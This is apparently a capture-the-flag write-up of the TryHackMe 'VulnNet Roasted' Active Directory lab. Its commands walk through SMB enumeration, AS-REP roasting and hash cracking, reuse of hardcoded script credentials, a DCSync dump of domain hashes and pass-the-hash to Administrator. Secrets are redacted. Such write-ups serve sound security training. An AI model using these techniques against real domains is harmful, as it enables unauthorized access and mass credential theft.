---
description: >-
  VulnNet Entertainment just deployed a new instance on their network with the
  newly-hired system administrators. Being a security-aware company, they as
  always hired you to perform a penetration test,
---

# VulnNet Roasted — THM

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Enumeration

I began by performing a service scan against the target.

```
nmap -sC -sV 10.49.130.227 -Pn  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-01 18:29 WIB  
Nmap scan report for 10.49.130.227  
Host is up (0.082s latency).  
Not shown: 989 filtered tcp ports (no-response)  
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-01 11:29:52Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:   
|   date: 2026-05-01T11:30:00  
|_  start_date: N/A  
| smb2-security-mode:   
|   3:1:1:   
|_    Message signing enabled and required  

  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 59.15 secondsThe combination of LDAP, Kerberos, and SMB immediately indicated that the target was an Active Directory Domain Controller.
```

SMB signing was enabled and required, preventing classic SMB relay attacks.

***

#### SMB Enumeration

Anonymous authentication was allowed.

```
smbclient -L \\\\10.49.129.57\\ -U guest
```

Discovered shares:

```
NETLOGON  
SYSVOL  
VulnNet-Business-Anonymous  
VulnNet-Enterprise-Anonymous
```

The two anonymous shares were accessible.

I connected to the Enterprise share.

```
smbclient \\\\10.49.129.57\\VulnNet-Enterprise-Anonymous -U guest
```

Downloaded every document.

```
get Enterprise-Operations.txt  
get Enterprise-Safety.txt  
get Enterprise-Sync.txt
```

Although these documents did not directly reveal credentials, they confirmed naming conventions and provided useful information about the organization.

***

### Foothold

#### Enumerating Domain Users

Since anonymous access was available, I enumerated Security Identifiers (SIDs).

```
python3 lookupsid.py vulnnet-rst.local/guest@10.48.167.24
```

This revealed several domain users:

```
enterprise-core-vn  
a-whitehat  
t-skid  
j-goldenhand  
j-leet
```

These usernames became candidates for Kerberos attacks.

***

#### AS-REP Roasting

Next, I checked whether any accounts had **Kerberos pre-authentication disabled**.

```
GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -dc-ip 10.48.167.24 -format hashcat
```

Most users required pre-authentication.

However, one account was vulnerable:

```
t-skid
```

The tool returned an AS-REP hash.

***

#### Cracking the Hash

The hash was cracked using Hashcat.

```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

This recovered the password for **t-skid**.

At this point I had valid domain credentials.

***

#### NETLOGON Enumeration

Using the newly obtained credentials, I explored the NETLOGON share.

```
smbclient \\\\10.48.167.24\\NETLOGON -U vulnnet-rst.local\\t-skid 
```

A password reset script was present.

```
ResetPassword.vbs
```

After downloading it,

```
get ResetPassword.vbs
```

I reviewed the source code.

The script contained hardcoded credentials:

```
strUserNTName = "a-whitehat"  
strPassword = "REDACTED"
```

This meant the administrator had accidentally stored the password that would be assigned to the **a-whitehat** account.

***

#### User Access

Using the recovered credentials, I authenticated through WinRM.

```
evil-winrm -i 10.48.167.24 -u a-whitehat -p REDACTED
```

Login succeeded.

I searched for the user flag.

```
Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content

THM{REDACTED}
```

User access was achieved.

***

### Privilege Escalation

#### DCSync Attack

While investigating the privileges of **a-whitehat**, I found the account possessed replication permissions required for a **DCSync** attack.

Instead of obtaining NTDS directly from disk, I requested password hashes over the replication protocol.

```
secretsdump.py -just-dc a-whitehat:REDACTED@10.48.167.24
```

The attack successfully dumped the NTDS secrets.

Among the results was the Administrator NTLM hash.

```
Administrator

NTLM: REDACTED
```

This confirmed that **a-whitehat** had the necessary directory replication privileges.

***

#### Pass-the-Hash

Rather than cracking the Administrator password, I authenticated directly using the NTLM hash.

```
evil-winrm -i 10.48.167.24 -u Administrator -H REDACTED
```

Authentication succeeded immediately

***

#### Root Flag

After obtaining administrative access, I searched for the system flag.

```
Get-ChildItem -Path C:\Users -Include *system.txt* -Recurse | Get-Content

THM{REDACTED}
```

Machine Complete
